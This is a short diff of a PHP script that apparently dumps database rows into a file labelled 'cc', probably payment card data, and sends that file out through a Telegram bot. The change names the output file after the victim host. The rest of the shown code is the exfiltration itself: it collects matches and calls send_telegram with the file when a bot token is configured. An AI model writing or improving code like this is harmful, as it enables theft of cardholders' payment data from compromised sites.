@@ -209,7 +209,8 @@ $stmt = $pdo->query($sql);
 $rows = $stmt->fetchAll();
 echo "Fetched " . count($rows) . " rows.\n";
 
-$outFile = __DIR__ . '/cc_' . date('Ymd_His') . '.txt';
+$clean_host = preg_replace('/[^a-zA-Z0-9.-]/', '_', $host_name);
+$outFile = __DIR__ . '/' . $clean_host . '-cc.txt';
 $fp = fopen($outFile, 'a'); 
 echo "Saving to: $outFile\n";
 
@@ -383,4 +384,3 @@ if ($found_count > 0 && $tg_bot_token !== 'ENTER_BOT_TOKEN_HERE') {
     send_telegram(null, $outFile);
 }
 ?>
-
